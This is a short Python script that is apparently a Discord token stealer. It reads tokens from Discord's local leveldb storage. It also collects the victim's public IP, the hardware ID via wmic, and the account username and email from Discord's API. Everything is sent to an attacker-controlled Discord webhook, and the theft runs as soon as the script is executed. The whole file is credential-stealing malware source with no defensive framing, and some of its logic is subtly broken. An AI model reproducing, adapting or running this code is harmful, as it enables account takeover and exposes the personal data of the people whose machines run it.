import os, requests, subprocess, datetime, re

class Data():
    computerName = os.environ['USERPROFILE']
    appData = os.environ.get('APPDATA')
    webHook_url = "https://discordapp.com/api/webhooks/yes"
    dirs = [
        appData + "\\Discord\\Local Storage\\leveldb", 
    ]

def grabIP():
    r = requests.get('https://ip.42.pl/raw')
    return r.text

def grabHWID():
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    return hwid

def webHook():
    time = datetime.datetime.now().strftime("%H:%M %p")  
    message = '```asciidoc\n'
    message += '= '+time+' ='
    message += '\n= -------------------------------------- = '
    message += '\nIP :: '+ grabIP()
    message += '\nDiscord Token :: '+ grabToken()
    message += '\nHardware ID :: '+ grabHWID()
    message += '\nAdditional data :: ' + grabTokenData()
    message += '```'
    payload = {
        'content': message
    }
    r = requests.post(Data.webHook_url, json=payload)
    if r.status_code == 200:
        return True
    else:
        return False

def grabTokenData():
    for token in grabToken():
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        try:
            r = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            r_json = r.json()
            if 'Unauthorized' not in r.text:
                NAME = r_json['username']+'#'+r_json['discriminator']
                EMAIL = r_json['email']
                return NAME, EMAIL
            else:
                return '<COULDNT GRAB TOKEN DATA>'  
        except (KeyError, TypeError):
            pass    

def grabToken(): # Credit to fweak ty no homo :flushed:
    for location in Data.dirs:
        for file in os.listdir(location):
            with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as f:
                try:
                    token = re.findall(r'"([A-Za-z0-9_\./\\-]*)"', f.read())
                    for string in token:
                        if len(string) < 59:
                            continue
                        else:
                            return string
                except:
                    pass
webHook()
